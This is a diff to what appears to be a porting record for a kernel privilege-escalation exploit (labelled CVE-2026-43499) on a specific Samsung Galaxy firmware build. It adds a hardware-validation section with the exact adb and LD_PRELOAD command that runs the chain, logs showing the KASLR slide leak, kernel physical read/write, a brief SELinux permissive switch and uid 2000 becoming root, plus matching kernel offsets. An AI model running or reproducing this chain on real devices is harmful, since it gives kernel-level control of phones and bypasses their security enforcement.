@@ -83,7 +83,52 @@ make TARGET=pa1q-S931BXXUCZZI4 release   # requires ANDROID_NDK_HOME
 - SHA-256: `2f9799912ec6c297d9190bc2b82ff417ff451854a08e9524fa549743470284af`
 - embedded label verified: `pa1q-S931BXXUCZZI4-app-physical-p0-oracle`
 
-## 7. Scope
+## 7. Hardware validation — PASS (2026-09-08)
 
-Offline only. No hardware run yet — requires flashing `S931BXXUCZZI4` and
-running the full chain (exploit -> temp root -> KernelSU late-load) on device.
+Device updated to `S931BXXUCZZI4` (fingerprint
+`samsung/pa1qxeea/pa1q:17/CP2A.260605.016/S931BXXUCZZI4_OXMCZZI4:user/release-keys`,
+kernel `6.6.127-android15-8-p33f4ffe-abogkiS931BXXUCZZI4-4k #1 SMP PREEMPT
+Wed Sep  2 08:11:10 UTC 2026`).
+
+Manual chain on a fresh, settled boot (~5 min uptime, SELinux Enforcing):
+
+```sh
+adb shell "CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root \
+  LD_PRELOAD=/data/local/tmp/cve-2026-43499-app.so /system/bin/id"
+```
+
+**Full chain succeeded on attempt 1/24.** Decisive log lines:
+
+```text
+[+] p0 profile pid=... phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff8029791638 bootid_data=ffffff802a4785c8 init_task=ffffff802a34e2c0 root_tg=ffffff802a55df80 sysctl_bootid=ffffff802a683910
+[+] slide-kaslr-ok source=tracefs pid=... base=ffffffc080090000 slide=0000000000090000 data_mode=canonical
+[*] root umh result wake=1 complete=1 retval=0 socket=1
+[*] root umh selinux left=0 intended root state old=1
+[+] pipe-physrw-summary pid=... done=1 root=1 kaslr=1 base=ffffffc080090000 slide=0000000000090000
+[+] pipe physrw pid=... done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
+[+] exploit completed attempt=1/24
+uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
+```
+
+- runtime addresses match the derived ZZI4 offsets exactly
+  (`slide_logger` = `KIMAGE_TEXT_BASE + 0x01791638` aliased, `init_task`
+  `0x0234e2c0`, `sysctl_bootid` `0x02683910`)
+- `getenforce` returned `Enforcing` after the run (permissive only during the
+  UMH handoff, restored as designed)
+- post-run under enforcing the root client is unreachable from the shell
+  context (`su: connect daemon: Permission denied`) — expected per the ZZHL
+  record; the daemon stays alive until reboot
+
+Operational note: an app-mediated run on this same boot earlier in the day
+(SamSU still bundling the ZZHL profile) also reached `root=1` — 18/25 offsets
+are shared, and the chain's load-bearing symbols are identical, so the ZZHL
+artifact happens to work on ZZI4; the ZZI4 profile remains the correct,
+exact-image-derived build (the P0 fingerprint and 7 shifted offsets differ).
+
+## 8. Scope
+
+Offline port + hardware-validated temp-root chain on `S931BXXUCZZI4`.
+KernelSU late-load for this kernel still needs an exact-vermagic (`p33f4ffe`)
+module build (section 8 of the ZZHL record) — the ZZHL ksud/module will not
+late-load on ZZI4 due to vermagic mismatch.
+
